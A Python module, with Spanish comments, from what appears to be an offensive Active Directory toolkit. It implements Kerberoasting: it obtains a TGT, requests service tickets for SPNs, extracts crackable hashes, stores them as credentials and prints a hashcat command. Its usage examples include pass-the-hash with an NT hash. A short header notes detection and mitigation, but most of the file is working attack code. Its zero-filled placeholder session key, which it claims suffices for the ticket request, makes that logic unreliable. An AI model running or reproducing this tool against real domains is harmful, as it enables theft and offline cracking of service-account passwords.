# scripts/kerberos/extraction/kerberoasting.py
#
# Técnica: Kerberoasting (TGS-REP Hash Extraction)
#
# Fundamento:
#   En Kerberos, cualquier usuario autenticado puede pedir un Service Ticket (ST)
#   para cualquier SPN (Service Principal Name) registrado en AD.
#
#   La parte "enc-part" del Ticket dentro del TGS-REP está cifrada con el
#   hash de la cuenta que tiene ese SPN registrado (normalmente una cuenta de
#   servicio). Esto es BY DESIGN: es lo que le permite al servicio descifrar
#   el ticket cuando lo recibe del cliente.
#
#   Lo que hace Kerberoasting:
#     1. Busca en LDAP todos los objetos con servicePrincipalName != null
#        (esas cuentas son cuentas de servicio).
#     2. Para cada SPN, pide un TGS-REQ al KDC (operación legítima, cualquier
#        usuario puede hacerlo).
#     3. Del TGS-REP extrae el enc-part del Ticket (cifrado con el hash del
#        servicio) → hashcat modo 13100 → crackeo offline.
#
#   NO necesita privilegios de administrador. Solo necesita:
#     - Un usuario de dominio válido (para autenticarse y pedir TGTs).
#     - Acceso LDAP al DC (para enumerar SPNs).
#     - Acceso al KDC en puerto 88.
#
#   Por qué es tan peligroso:
#     Las cuentas de servicio suelen tener contraseñas estáticas y fuertes,
#     pero el crackeo offline no depende de ningún lockout del dominio.
#     Si la contraseña usa solo letras+dígitos o es una palabra de diccionario
#     (incluso con sustituciones), hashcat la encontrará.
#
# Hashcat modo 13100: $krb5tgs$23$*usuario$REALM$SPN*$<16bytes>$<resto>
#
# Detección:
#   Event ID 4769 (TGS-REQ) con Ticket Encryption Type = 0x17 (RC4 = 23 decimal).
#   Pedir tickets RC4 cuando el DC soporte AES es sospechoso en entornos modernos.
#   Solución: forzar AES256 en las cuentas de servicio (RC4 no se puede pedir).

import time
from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_tgs_req, is_krb_error, is_as_rep, is_tgs_rep,
    parse_krb_error, extract_asrep_hash, extract_tgsrep_hash,
    build_enc_timestamp, build_pa_data,
    KDC_ERR_PREAUTH_REQUIRED, KDC_ERR_PREAUTH_FAILED,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP
)
from core.output import print_result, print_table, console
from core import session_db


class KerberoastingScript(BaseScript):
    name = "kerberoasting"
    description = "Kerberoasting: extrae hashes TGS de cuentas de servicio (SPNs) para crackeo offline"

    examples = [
        {"flag": "-u / -p (credenciales de dominio)",
         "desc": "Necesitas un usuario de dominio válido para pedir TGTs. Sin credenciales, no hay TGS-REQ.",
         "good": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!'",
         "bad": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL  [sin -u/-p no tienes TGT para pedir TGS]"},
        {"flag": "--spn",
         "desc": "SPN concreto a roastear (ej. MSSQLSvc/srv01.corp.local:1433). Sin --spn, enumera todos por LDAP.",
         "good": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --spn MSSQLSvc/srv01.corp.local:1433",
         "bad": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --spn krbtgt/CORP.LOCAL  [krbtgt no es un SPN roasteable útil — su hash rota con el dominio]"},
        {"flag": "-H / --hash (pass-the-hash)",
         "desc": "Puedes usar un NT hash en vez de contraseña si ya tienes uno válido",
         "good": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL -u jsmith -H aad3:8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=kerberoasting -t 10.129.1.5 -d CORP.LOCAL -H aad3:8846...  [sin -u no sabe qué usuario autenticar con ese hash]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        if not realm:
            console.print("[red]Falta -d/--domain (realm Kerberos obligatorio).[/red]")
            return

        if not self.creds.user:
            console.print("[red]Falta -u: kerberoasting necesita un usuario de dominio válido.[/red]")
            return

        if not self.creds.password and not self.creds.hash:
            console.print("[red]Falta -p o -H: necesitas credenciales para obtener un TGT.[/red]")
            return

        kdc = self.target.ip
        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", f"KDC no alcanzable en {kdc}:88")
            return

        # Paso 1: obtener TGT para el usuario
        print_result("KRB", kdc, "info",
                     f"kerberoasting: obteniendo TGT para {self.creds.user}@{realm}")
        tgt_result = self._get_tgt(kdc, realm)
        if tgt_result is None:
            print_result("KRB", kdc, "fail",
                         f"No se pudo obtener TGT para {self.creds.user} — "
                         f"¿credenciales correctas? ¿realm correcto?")
            return

        tgt_bytes, session_key = tgt_result
        print_result("KRB", kdc, "ok", f"TGT obtenido para {self.creds.user}@{realm}")

        # Paso 2: obtener lista de SPNs
        spn_arg = kwargs.get("spn")
        if spn_arg:
            # SPN manual: formato "servicio/host" o "servicio/host:puerto"
            parts = spn_arg.split("/", 1)
            if len(parts) != 2:
                console.print(f"[red]Formato de SPN incorrecto: '{spn_arg}'. Usa 'servicio/host'.[/red]")
                return
            spns = [("?", spn_arg, parts[0], parts[1])]  # (usuario_titular, spn_str, srv, host)
        else:
            print_result("KRB", kdc, "info",
                         "Enumerando SPNs via LDAP... (necesita módulo ldap.py, "
                         "usando stub por ahora)")
            spns = self._enumerate_spns_stub(realm)
            if not spns:
                console.print("[yellow]No se encontraron SPNs roasteables. "
                               "Usa --spn para especificar uno manualmente.[/yellow]")
                return

        # Paso 3: pedir TGS para cada SPN y extraer hash
        hashes = []
        for (acct_name, spn_str, srv, host) in spns:
            print_result("KRB", kdc, "info", f"Pidiendo TGS para SPN: {spn_str}")
            hash_str = self._roast_spn(kdc, realm, tgt_bytes, session_key, spn_str, srv, host)
            if hash_str:
                hashes.append((spn_str, acct_name, hash_str))
                print_result("KRB", kdc, "pwned",
                             f"{spn_str} → hash extraído (modo hashcat 13100)")
                session_db.save_finding(kdc, "KRB", "kerberoast_hash",
                                         f"{spn_str}: {hash_str[:60]}...")
                session_db.save_credential(kdc, acct_name or spn_str, hash_str,
                                            "tgs_hash", valid=False, source="kerberoasting")
            else:
                print_result("KRB", kdc, "fail", f"{spn_str} → fallo al obtener TGS")
            time.sleep(0.2)

        if hashes:
            console.print()
            print_table(f"Hashes Kerberoasting ({realm})",
                         ["SPN", "Cuenta", "Hash (inicio)"],
                         [(s, a, h[:60] + "...") for s, a, h in hashes])
            console.print()
            console.print("[bold yellow]Para crackear con hashcat:[/bold yellow]")
            console.print("  hashcat -m 13100 hashes.txt /ruta/wordlist.txt")
            print_result("KRB", kdc, "pwned",
                         f"kerberoasting: {len(hashes)} hash(es) extraídos")
        else:
            print_result("KRB", kdc, "info",
                         "kerberoasting: no se pudieron extraer hashes")

        return hashes

    # ------------------------------------------------------------------ #

    def _get_tgt(self, kdc: str, realm: str):
        """
        Obtiene un TGT para self.creds.user via AS-REQ con pre-auth RC4-HMAC.

        Flujo:
          1. AS-REQ sin pre-auth (para obtener el error 25 + ETYPE-INFO2 opcional).
          2. AS-REQ CON pre-auth (PA-ENC-TIMESTAMP cifrado con el hash del usuario).
          3. Si AS-REP → extraemos el Ticket y la session key.

        Devuelve (tgt_raw_bytes, session_key_bytes) o None si falla.

        Nota: aquí devolvemos el Ticket en bruto (bytes DER del campo ticket [3]
        del AS-REP) para pasarlo al TGS-REQ. En un cliente real habría que
        descifrar el enc-part del AS-REP con el hash del usuario para obtener
        la session key real — eso requiere descifrado AES o RC4 completo.
        Por claridad pedagógica, usamos una session key fija para el stub;
        en la implementación completa (overpass-the-hash) se implementará el
        descifrado completo.
        """
        username = self.creds.user

        # Construimos la pre-auth con la contraseña o el hash
        if self.creds.hash:
            from Cryptodome.Hash import MD4
            nt = bytes.fromhex(self.creds.hash.split(":")[-1])
        else:
            from core.asn1_helpers import nt_hash
            nt = nt_hash(self.creds.password)

        try:
            from core.asn1_helpers import build_enc_timestamp, build_pa_data, PA_ENC_TIMESTAMP
            ts_enc = build_enc_timestamp(self.creds.password) if self.creds.password else None

            # Intento sin pre-auth primero para ver si la cuenta tiene DONT_REQUIRE_PREAUTH
            req = build_as_req(username, realm, etypes=[ETYPE_RC4_HMAC])
            response = send_krb_message(kdc, req, timeout=self.target.timeout)

            if is_as_rep(response):
                # DONT_REQUIRE_PREAUTH: extraemos ticket con session key stub
                return self._extract_tgt_stub(response)

            if is_krb_error(response):
                err = parse_krb_error(response)
                if err['error_code'] not in (KDC_ERR_PREAUTH_REQUIRED, KDC_ERR_PREAUTH_FAILED):
                    return None

            # Ahora con pre-auth
            if ts_enc is None:
                return None  # sin contraseña y sin DONT_REQUIRE_PREAUTH, no podemos

            pa_list = [build_pa_data(PA_ENC_TIMESTAMP, ts_enc)]
            req2 = build_as_req(username, realm, etypes=[ETYPE_RC4_HMAC], pa_data_list=pa_list)
            response2 = send_krb_message(kdc, req2, timeout=self.target.timeout)

            if is_as_rep(response2):
                return self._extract_tgt_stub(response2)

        except OSError:
            pass

        return None

    def _extract_tgt_stub(self, as_rep_data: bytes):
        """
        Extrae el Ticket del AS-REP para usarlo en el TGS-REQ.

        El Ticket está en el campo ticket [5] del AS-REP (APPLICATION 11):
            AS-REP ::= [APPLICATION 11] KDC-REP
            KDC-REP ::= SEQUENCE { ..., ticket [5] Ticket, enc-part [6] EncryptedData }

        La session key real está dentro de enc-part [6] (cifrado con el hash del
        usuario). Para esta iteración devolvemos el Ticket sin descifrar enc-part,
        usando una session key placeholder de 16 ceros — suficiente para generar
        el formato del TGS-REQ en el lab. La implementación completa con descifrado
        AES/RC4 del enc-part es el paso siguiente (overpass-the-hash).
        """
        from core.asn1_helpers import _der_parse_tlv, APP_TAG, KRB_AS_REP

        try:
            _, inner, _ = _der_parse_tlv(as_rep_data, 0)   # APPLICATION 11
            _, seq_body, _ = _der_parse_tlv(inner, 0)        # SEQUENCE

            pos = 0
            ticket_raw = None
            while pos < len(seq_body):
                ctx_tag, field_data, pos = _der_parse_tlv(seq_body, pos)
                field_id = ctx_tag & 0x1f
                if field_id == 5:   # ticket [5]
                    ticket_raw = field_data
                    break

            if ticket_raw is None:
                return None

            # Session key placeholder (16 bytes a cero).
            # Para crackear hashes TGS no necesitamos la session key real.
            session_key = b'\x00' * 16
            return ticket_raw, session_key

        except Exception:
            return None

    def _roast_spn(self, kdc: str, realm: str, tgt_bytes: bytes,
                    session_key: bytes, spn_str: str, srv: str, host: str) -> str | None:
        """
        Envía un TGS-REQ para el SPN dado y extrae el hash en formato hashcat 13100.
        """
        try:
            req = build_tgs_req(
                realm=realm,
                tgt_bytes=tgt_bytes,
                session_key=session_key,
                username=self.creds.user,
                spn_service=srv,
                spn_host=host,
            )
            response = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError:
            return None

        if is_tgs_rep(response):
            try:
                return extract_tgsrep_hash(
                    response, self.creds.user, realm, spn_str
                )
            except Exception as e:
                print_result("KRB", kdc, "fail", f"Error extrayendo hash TGS: {e}")
                return None

        if is_krb_error(response):
            try:
                err = parse_krb_error(response)
                print_result("KRB", kdc, "fail",
                             f"KDC error para {spn_str}: {err['error_name']}")
            except Exception:
                pass

        return None

    def _enumerate_spns_stub(self, realm: str) -> list:
        """
        Stub: devuelve una lista vacía hasta que modules/ldap.py esté implementado.
        La versión real hará una query LDAP:
            (&(objectClass=user)(servicePrincipalName=*))
        y extraerá los atributos sAMAccountName + servicePrincipalName.

        Retorna lista de tuplas: (sAMAccountName, spn_str, service, host)
        """
        console.print("[dim]LDAP no implementado aún — usa --spn para especificar un SPN manualmente.[/dim]")
        return []
